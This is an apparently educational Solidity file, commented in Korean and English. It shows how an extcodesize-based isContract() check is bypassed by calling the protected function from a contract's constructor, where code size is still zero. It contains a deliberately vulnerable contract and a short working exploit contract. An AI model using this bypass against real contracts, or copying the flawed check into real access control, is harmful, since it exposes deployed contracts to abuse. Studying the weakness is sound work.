// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ExampleSmartContract {
    function isContract(address account) public view returns (bool) {
        uint size;
        assembly {
            size := extcodesize(account) // return address's code hash
        }

        // address의 code hash의 length가 0이면 EOA
        // address의 code hash의 lenfth가 0보다 크면 CA
        return size > 0;
    }

    bool public pwned = false;

    function onlyHumanCanCall() public {
        // msg.sender가 지갑주소면 isContract(msg.sender) = false
        // msg.sender가 컨트렉트 주소면 isContract(msg.sender) = true
        require(!isContract(msg.sender), "no contract allowed");
        pwned = true;
    }
}

contract FailedAttack {
    // 다른 컨트렉트에서 ExampleSmartContract로 Call()하게 되면
    // msg.sender는 FailedAttack 컨트렉트 주소가 되어
    // onlyHumanCanCall() 실행 실패
    function pwn(address _target) external {
        ExampleSmartContract(_target).onlyHumanCanCall();
    }
}

contract Hack {
    // When contract is being created, code size (extcodesize) is 0.
    // 컨트렉트가 최초로 생성될 때, code hash는 constructor가 실행된 후에 바이트코드가 최종적으로 생성되기에,
    // 그 전까지 code hash는 비어 있습니다.( = Zero Code Size )
    constructor(address _target) {
        // 아직 컨트렉트의 바이트코드가 최종적으로 생성되기 전에 onlyHumanCanCall()함수가 실행됨으로,
        // isContract()에서 msg.sender를 지갑주소(EOA)로 잘못 판단합니다.
        ExampleSmartContract(_target).onlyHumanCanCall();
    }
}


